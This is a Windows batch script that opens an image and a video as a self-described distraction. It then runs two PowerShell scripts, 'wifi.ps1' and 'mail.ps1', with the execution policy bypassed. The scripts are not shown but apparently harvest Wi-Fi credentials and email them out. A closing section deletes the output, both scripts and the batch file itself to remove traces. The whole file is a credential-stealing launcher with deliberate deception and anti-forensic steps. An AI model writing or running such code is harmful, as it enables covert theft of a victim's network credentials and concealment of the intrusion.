@echo off
start https://images2.fanpop.com/image/photos/8900000/anime-girl-anime-girls-8951100-1800-2560.jpg
TIMEOUT /T 1 /NOBREAK > NUL
start https://www.youtube.com/watch?v=m3w1mUXtCj0
@REM distraction part ends here

powershell.exe -ExecutionPolicy Bypass -File "wifi.ps1" > output.txt
TIMEOUT /T 5 /NOBREAK > NUL
powershell.exe -ExecutionPolicy Bypass -File "mail.ps1"
TIMEOUT /T 3 /NOBREAK > NUL

@REM  Delete all traces and self-delete
del output.txt
del wifi.ps1
del mail.ps1
(
    start "" cmd /c del "%~f0"
)